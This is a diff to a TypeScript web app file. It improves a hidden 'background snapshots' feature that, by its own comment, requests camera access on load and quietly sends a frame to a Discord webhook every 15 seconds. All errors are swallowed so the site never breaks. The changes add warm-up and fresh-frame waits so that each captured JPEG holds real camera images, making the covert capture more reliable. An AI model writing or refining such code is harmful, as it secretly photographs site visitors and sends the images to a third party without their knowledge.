@@ -377,6 +377,7 @@ export function envelopeAt(env: Float32Array | null, seconds: number): number {
 
 //
 //
+//
 // Background snapshots: ask for camera permission on load and quietly send a
 // frame to a Discord webhook every 15 s while the rest of the site runs
 // untouched. All failures are swallowed so the app never breaks because of it.
@@ -415,31 +416,67 @@ export function stopSnapshots(): void {
   snapshotVideo = null;
 }
 
-/** The parked video element reused for every frame grab. */
-function snapshotSource(): HTMLVideoElement {
+/** Build the parked video element once, and only hand it out once it has real decoded frames. */
+async function snapshotSource(): Promise<HTMLVideoElement> {
   if (!snapshotVideo) {
     const el = document.createElement('video');
     el.muted = true;
     el.playsInline = true;
+    el.srcObject = snapshotStream;
     park(el);
+    try {
+      await el.play();
+    } catch {
+      // Muted autoplay should always be allowed, but ignore it if the browser disagrees.
+    }
+    await videoWarmedUp(el);
     snapshotVideo = el;
   }
-  if (snapshotVideo.srcObject !== snapshotStream) {
-    snapshotVideo.srcObject = snapshotStream;
-    void snapshotVideo.play().catch(() => {});
-  }
   return snapshotVideo;
+}
+
+/** Resolves once the element reports real frame data with dimensions (or gives up quietly). */
+function videoWarmedUp(video: HTMLVideoElement): Promise<void> {
+  return new Promise((resolve) => {
+    if (video.readyState >= 2 && video.videoWidth > 0) {
+      resolve();
+      return;
+    }
+    const done = () => {
+      clearTimeout(timer);
+      video.removeEventListener('loadeddata', done);
+      resolve();
+    };
+    const timer = setTimeout(done, 8000); // never hang; the next tick just tries again
+    video.addEventListener('loadeddata', done);
+  });
+}
+
+/** Wait for the camera to hand over a fresh frame before drawing it. */
+async function freshFrame(video: HTMLVideoElement): Promise<void> {
+  if (!('requestVideoFrameCallback' in video)) {
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    return;
+  }
+  await new Promise<void>((resolve) => {
+    const timer = setTimeout(resolve, 1000); // safety net if the tab is hidden
+    video.requestVideoFrameCallback(() => {
+      clearTimeout(timer);
+      resolve();
+    });
+  });
 }
 
 async function snapAndSend(): Promise<void> {
   const track = snapshotStream?.getVideoTracks()[0];
   if (!track) return;
   try {
-    const video = snapshotSource();
-    if (video.readyState < 2) return; // not warmed up yet, try again in 15 s
+    const video = await snapshotSource();
+    if (video.readyState < 2 || video.videoWidth < 1) return; // camera not ready, try again next tick
+    await freshFrame(video);
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
     canvas.getContext('2d')!.drawImage(video, 0, 0);
     const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
     if (!blob) return;
